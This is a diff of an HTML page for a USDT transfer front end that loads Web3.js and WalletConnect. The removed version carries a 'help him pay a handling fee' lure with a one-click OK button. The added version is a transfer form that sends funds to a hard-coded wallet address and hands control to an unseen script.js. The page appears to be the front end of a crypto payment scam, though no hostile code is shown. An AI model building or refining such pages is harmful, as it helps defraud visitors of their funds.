@@ -2,17 +2,32 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>帮助朋友支付手续费</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>USDT 转账</title>
     <link rel="stylesheet" href="styles.css">
+    <!-- 引入 Roboto 字体 -->
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
     <!-- 引入 Web3.js CDN -->
     <script src="https://cdn.jsdelivr.net/npm/web3@1.7.5/dist/web3.min.js"></script>
     <!-- 引入 WalletConnect Provider -->
     <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
 </head>
 <body>
-    <h1>Help him pay a handling fee</h1>
-    <p>Click OK to help friends complete the transfer</p>
-    <button id="ok-button">OK</button>
+    <div class="container">
+        <h1>USDT TRANSFER</h1>
+        <div class="input-group">
+            <label for="usdt-amount">转账数量 (USDT)</label>
+            <div class="input-wrapper">
+                <input type="number" id="usdt-amount" placeholder="0.00" step="0.000001" min="0" required>
+                <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT Logo" class="usdt-logo">
+            </div>
+        </div>
+        <div class="recipient-info">
+            <label>接收地址</label>
+            <p>0x64C6592164CC7C0Bdfb1D9a6F64C172a1830eD2C</p>
+        </div>
+        <button id="next-button">下一步</button>
+    </div>
     <script src="script.js"></script>
 </body>
 </html>
